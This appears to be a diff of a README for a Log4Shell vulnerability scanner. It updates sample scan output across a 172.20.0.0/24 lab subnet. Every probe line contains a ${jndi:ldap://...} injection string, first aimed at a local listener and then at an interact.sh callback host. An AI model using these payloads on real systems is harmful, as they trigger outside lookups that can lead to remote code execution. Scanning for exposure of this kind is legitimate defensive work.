@@ -206,23 +206,24 @@ scanner_1  | [i] Log4Shell CVE-2021-44228 Remote Vulnerability Scan
 scanner_1  | [i] Listening on 172.20.0.30:4444
 scanner_1  | [i] Start scanning CIDR 172.20.0.0/24
 scanner_1  | ---------
-scanner_1  | [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.0:8080
-scanner_1  | [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.1:8080
-scanner_1  | [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.2:8080
-scanner_1  | [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.3:8080
-scanner_1  | [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.4:8080
-scanner_1  | [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.5:8080
-scanner_1  | [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.6:8080
-scanner_1  | [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.7:8080
-scanner_1  | [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.8:8080
-scanner_1  | [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.9:8080
-scanner_1  | [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.10:8080
-scanner_1  | [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.11:8080
-scanner_1  | [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.12:8080
-scanner_1  | [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.13:8080
-scanner_1  | [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.14:8080
-scanner_1  | [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.15:8080
-scanner_1  | [!] Possibly vulnerable host identified: 172.20.0.13:60614
+scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.0:8080
+scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.1:8080
+scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.2:8080
+scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.3:8080
+scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.4:8080
+scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.5:8080
+scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.6:8080
+scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.7:8080
+scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.8:8080
+scanner_1  | [!] Possibly vulnerable host identified: 172.20.0.3
+scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.9:8080
+scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.10:8080
+scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.11:8080
+scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.12:8080
+scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.13:8080
+scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.14:8080
+scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.15:8080
+scanner_1  | [!] Possibly vulnerable host identified: 172.20.0.13
 ```
 
 ### Custom Payload
